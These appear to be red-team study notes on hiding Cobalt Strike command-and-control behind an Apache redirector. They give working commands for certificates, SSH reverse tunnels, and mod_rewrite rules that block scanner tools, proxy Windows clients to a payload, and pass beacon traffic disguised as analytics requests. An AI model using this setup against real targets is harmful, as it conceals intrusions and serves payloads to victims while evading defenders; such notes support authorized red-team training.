- Apache - SSL redirector setup
	```
	sudo apt install apache2
	sudo a2enmod ssl rewrite proxy proxy_http
	cd /etc/apache2/sites-enabled; sudo rm 000-default.conf
	sudo ln -s ../sites-available/default-ssl.conf .
	sudo systemctl restart apache2
	```
	- Generate fresh SSL certificate
		- `openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key`
		- Fields are arbitrary, but the Common Name should be the public IP or fully qualified domain name
		- Get certificates signed by trusted CA - generate a certificate signing request (CSR)
			- `openssl req -new -key private.key -out acme.csr`
		- Use certbot to get it signed - note that public IP is logged at thi stage
			- `certbot certonly -d acmecorp.uk --apache --register-unsafely-without-email --agree-tos`
		- Copy signed certs into appropriate directories
			- `cp /etc/letsencrypt/archive/acmecorp.uk/fullchain.pem /etc/ssl/certs`
			- `cp /etc/letsencrypt/archive/acmecorp.uk/privkey.pem /etc/ssl/private`
			- Remember to update SSLCertificateFile and SSLCertificateKeyFile in `/etc/apache2/sites-available/default-ssl.conf`
		- TIP: add this line to default-ssl to force Apache to ignore Cobalt Strike's self-signed ssl certificate on the HTTPS listener
			- `SSLProxyCheckPeerCN off`
		- Restart Apache
			- `sudo systemctl restart apache2`
			
- Teamserver config - import public certificate and private key from certbot into your Cobalt Strike Java KeyStore
	- Combine into PKCS12
		- `openssl pkcs12 -inkey private.key -in public.crt -export -out acme.pkcs12`
	- Convert into Java KeyStore using keytool
		- `keytool -importkeystore -srckeystore acme.pkcs12 -srcstoretype pkcs12 -destkeystore acme.store`
	- Reference KeyStore in a malleable C2 profile
	```
	https-certificate {
	     set keystore "acme.store";
	     set password "password";
	}
	```
	- KeyStore should be in the same directory as Cobalt Strike teamserver
		- `sudo ./teamserver 10.10.0.69 Passw0rd! c2-profiles/normal/webbug_getonly.profile`

- Generate SSH tunnel between teamserver and redirector (manual)
	- `ssh -N -R 8443:localhost:443 -i ssh-user ssh-user@<redirector IP>`
	- Verify listening port on redirector
		- `sudo ss -ltnp`
		- `curl -v -k https://localhost:8443`
			- Check CS web log to verify
	- Verify the web server port is not reachable directly
		- `curl -v -k https://<teamserver listener IP>`

- Generate SSH tunnel between teamserver and redirector (autossh)
	- `vim ~/.ssh/config`
	```
	Host                 redirector-1
	HostName             10.10.5.39
	User                 ssh-user
	Port                 22
	IdentityFile         /home/ubuntu/ssh-user
	RemoteForward        8443 localhost:443
	ServerAliveInterval  30
	ServerAliveCountMax  3
	```
	- `autossh -M 0 -f -N redirector-1`

- Configure .htaccess
	- `vim /etc/apache2/sites-enabled/default-ssl.conf
		- Under </VirtualHost>, add:
	```
	<Directory /var/www/html/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride All
		Require all granted
	</Directory>
	```
	- Underneath `SSLEngine on`, add `SSLProxyEngine on`
	- Restart Apache
		- `sudo systemctl restart apache2`
	- Overwrite index.html with content (ideally that looks nice and semi-legit)
		- `echo "Hello from Apache" | sudo tee /var/www/html/index.html`
	- Create a new .htaccess file in the Apache web root (/var/www/html) and enter the following:
		```
		RewriteEngine on
		RewriteRule ^test$ index.html [NC]
		```
		- Processed top to bottom
		- Watch out for infinite loops
	- NOTE: RewriteRule is a simple redirect; first param is a regex and second is a redirection target (can be external domain)
	- `[NC]` means to ignore case
		- Multiple flags can be used with the syntax: `[Flag1,Flag2,FlagN]`
		```
		    [L] - Last.  Tells mod_rewrite to stop processing further rules.
		    [NE] - No Escape.  Don't encode special characters (e.g. & and ?) to their hex values.
		    [P] - Proxy.  Handle the request with mod_proxy.
		    [R] - Redirect.  Send a redirect code in response.
		    [S] - Skip.  Skip the next N number of rules.
		    [T] - Type.  Sets the MIME type of the response.
		```
	- Test:
		- `curl -k https://localhost/test`
	- RewriteCond can be combined with RewriteRule to only redirect under certain conditions: `TestString Condition [Flags]`
		- Test string can be static but also variables, such as `%{REMOTE_ADDR}`, `%{HTTP_COOKIE}`, `${HTTP_USER_AGENT}`, `%{REQUEST_URI}`
		- Multiple conditions can be defined, AND by default but `[OR]` flag can be specified
		- https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html
	- User-Agent redirect
		- Blocking curl and wget:
		```
		RewriteEngine on
		
		RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
		RewriteRule .* - [F]
		```
		- Redirecting based on Windows 10 devices:
		```
		RewriteCond %{HTTP_USER_AGENT} "Windows NT 10.0" [NC]
		RewriteRule .* https://localhost:8443/win-payload [P]
		```
		- `[P]` proxies request to the backend in a way that's transparent to the requestor; looks like it came from Apache, even if it came from Cobalt Strike
	- Cookie redirect
		- Example:
		```
		RewriteEngine on
		
		RewriteCond %{HTTP_COOKIE} TestCookie [NC]
		RewriteRule .* https://localhost:8443/cookie-test [P]
		```
	- Request URI and Query String redirect
		- For the `webbug_getonly` malleable C2 profile using the URI
		```
		RewriteEngine on
		
		RewriteCond %{REQUEST_URI} win-payload [NC]
		RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
		
		RewriteCond %{REQUEST_URI} __utm.gif [NC]
		RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
		```
		- With the query string
		```
		RewriteEngine on
		
		RewriteCond %{REQUEST_URI} win-payload [NC]
		RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
		
		RewriteCond %{REQUEST_URI} __utm.gif [NC]
		RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma [NC,OR]
		RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma [NC]                                                                       
		RewriteRule .* https://localhost:8443%{REQUEST_URI} [P]
		
		RewriteRule .* - [F]
		```

- cs2modrewrite - automatically generate mod_rewrite rules
	- Must add explicit user agent in malleable c2 profile (global option)
		- `set useragent "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko";`
	- Run the script
		- `python3 cs2modrewrite.py -i <path/to/malleable/c2> -c https://teamserver:8443 -r https://www.invalidtraffic.com -o <output-file>`
	- Does the heavy lifting, but might need a little tweaking

